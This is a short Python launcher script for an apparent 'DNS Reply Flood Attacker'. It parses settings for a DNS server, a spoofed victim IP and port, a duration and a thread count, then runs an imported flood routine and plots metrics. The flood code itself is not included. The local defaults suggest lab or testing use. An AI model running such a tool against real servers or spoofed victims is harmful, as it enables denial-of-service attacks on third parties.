import argparse
import signal
import sys
import time
from rich.console import Console

from attack.dns_reply_flood import DNSReplyFlood


def main():
    console = Console()
    parser = argparse.ArgumentParser(
        description="DNS Reply Flood Attacker",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter,
    )
    parser.add_argument(
        "--server-ip", type=str, default="127.0.0.1", help="DNS server IP address"
    )
    parser.add_argument("--server-port", type=int, default=53, help="DNS server port")
    parser.add_argument(
        "--target-ip", type=str, default="192.168.1.100", help="Spoofed victim IP"
    )
    parser.add_argument(
        "--target-port", type=int, default=12345, help="Spoofed victim port"
    )
    parser.add_argument(
        "--duration", type=int, default=30, help="Attack duration in seconds"
    )
    parser.add_argument(
        "--threads", type=int, default=10, help="Number of attack threads"
    )
    parser.add_argument(
        "--log-file", type=str, default=None, help="Log file path (optional)"
    )
    parser.add_argument(
        "--report-dir",
        type=str,
        default=None,
        help="Directory to save attack plots (optional)",
    )
    args = parser.parse_args()

    attack = DNSReplyFlood(
        server_ip=args.server_ip,
        server_port=args.server_port,
        target_ip=args.target_ip,
        target_port=args.target_port,
        duration=args.duration,
        threads=args.threads,
        log_file=args.log_file,
        report_dir=args.report_dir,
    )

    def handle_sigint(signum, frame):
        console.print("\n[red]🛑 Received interrupt. Stopping attack...[/red]")
        attack.attack_active = False
        # Wait a moment for threads to finish
        time.sleep(0.5)
        end_time = time.time()
        attack._summarize_attack(attack.metrics.get("start_time", end_time), end_time)
        attack.log_dns_request_stats()
        attack.plot_metrics()
        sys.exit(0)

    signal.signal(signal.SIGINT, handle_sigint)

    try:
        attack.attack()
    except KeyboardInterrupt:
        handle_sigint(None, None)


if __name__ == "__main__":
    main()
